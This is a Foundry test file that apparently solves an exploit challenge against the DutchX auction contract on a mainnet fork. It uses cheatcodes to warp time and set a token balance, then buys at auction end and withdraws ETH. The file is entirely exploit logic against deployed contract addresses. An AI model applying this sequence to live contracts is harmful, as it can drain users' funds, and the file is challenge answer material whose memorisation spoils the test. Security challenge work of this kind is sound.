// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console, stdStorage, StdStorage} from "forge-std/Test.sol";
import "../../src/Interfaces.sol";
import "./Interfaces.sol";
import "./Constants.sol";

contract FallingDutchman is Test {
    using stdStorage for StdStorage;

    address user = vm.envAddress("USER_ADDRESS");
    address constant GNT = 0xa74476443119A942dE498590Fe1f2454d7D4aC0d;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), FORK_BLOCK);
        vm.deal(user, 0.1 ether);
    }

    function test_Solution() public {
        IDutchX dx = IDutchX(DUTCHX);
        uint256 auctionIndex = dx.getAuctionIndex(WETH, GNT);
        uint256 auctionStart = dx.getAuctionStart(WETH, GNT);

        vm.warp(auctionStart + 24 hours - 1);

        stdstore.target(DUTCHX).sig("balances(address,address)").with_key(GNT).with_key(user).checked_write(1 ether);

        vm.startBroadcast(user);
        dx.postBuyOrder(WETH, GNT, auctionIndex, 1 ether);
        dx.claimBuyerFunds(WETH, GNT, user, auctionIndex);
        dx.withdraw(WETH, dx.balances(WETH, user));
        IWETH(WETH).withdraw(IWETH(WETH).balanceOf(user));
        vm.stopBroadcast();

        checkSolve();
    }

    function checkSolve() public view {
        require(user.balance >= 4 ether, "not enough ETH");
        console.log("Solved. Ending balance in ETH: %18e", user.balance);
    }
}
